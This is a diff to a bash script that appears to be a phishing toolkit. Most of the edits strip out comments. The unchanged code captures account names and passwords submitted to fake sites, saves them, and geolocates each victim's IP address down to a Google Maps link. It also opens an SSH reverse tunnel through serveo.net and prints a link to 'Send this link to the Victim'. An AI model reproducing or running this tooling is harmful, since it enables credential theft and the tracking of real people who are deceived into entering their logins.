@@ -230,22 +230,20 @@ getcredentials() {
 }
 
 catch_cred() {
-    # Extract the account and password from usernames.txt
+
     account=$(grep -o 'Account:.*' "sites/$website/usernames.txt" | cut -d " " -f2)
     password=$(grep -o 'Pass:.*' "sites/$website/usernames.txt" | cut -d ":" -f2)
 
-    # Print the account and password
+
     printf "${GREEN}[👤👤👤]${ORANGE} Account: ${RED}%s\n" "$account"
     printf "${GREEN}[🔑🔑🔑]${ORANGE} Password: ${RED}%s\n" "$password"
 
-    # Save the extracted data to saved.usernames.txt
+
     cat "sites/$website/usernames.txt" >> "sites/$website/saved.usernames.txt"
 
-    # Clear the contents of usernames.txt to wait for the next set of credentials
     > "sites/$website/usernames.txt"
     rm -f "sites/$website/ip.txt"
 
-    # Print a message indicating the data has been saved
     printf "${GREEN}[-]${ORANGE} Saved:${RED} sites/%s/saved.usernames.txt \n" "$website"
     checkfound
 }
@@ -255,8 +253,7 @@ ip_location() {
     # Fetch IP information from two different APIs
     ipaddripapico=$(curl -s "https://ipapi.co/$ip/json" -L)
     ipaddripapicom=$(curl -s "http://ip-api.com/json/$ip" -L)
-
-    # Extract relevant information from the JSON responses
+    
     userip=$(echo "$ipaddripapico" | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
     usercity=$(echo "$ipaddripapico" | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     useregion=$(echo "$ipaddripapico" | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
@@ -268,7 +265,6 @@ ip_location() {
     userisp=$(echo "$ipaddripapico" | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     usercalling=$(echo "$ipaddripapico" | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
 
-    # Display the IP information
     printf "${RED}-----------------------------IP Details---------------------------------------------------------\n"
     printf "  ${ORANGE}  City            >>         ${GREEN}   %s\n" "$usercity"                                       
     printf "${GREEN}----------------------------------------------------------------------------------------------\n"
@@ -291,7 +287,6 @@ ip_location() {
     printf "  ${ORANGE}  Google Location >>         ${CYAN} https://maps.google.com/?q=%s,%s\n" "$userlat" "$userlon"
     printf "${RED}------------------------------------------------------------------------------------------------\n"
 
-    # Call getcredentials function to proceed after displaying IP information
     getcredentials
 }
 
@@ -329,11 +324,9 @@ tunnel() {
     sleep 2
     printf "${RED}[&]${BLUE} Starting Serveo server ...\n"
 
-    # Capture output of SSH in a background process and parse it for the URL
     ssh -R 80:localhost:3333 serveo.net > serveo_log.txt 2>&1 &
     sleep 10
 
-    # Extract the link from the Serveo log file
     link=$(grep -Eo '(https)://[^/"]+(.serveo.net)' serveo_log.txt | head -n 1)
 
     printf "${RED}(*) ${YELLOW}Send this link to the Victim: ${CYAN}%s \n" "$link"
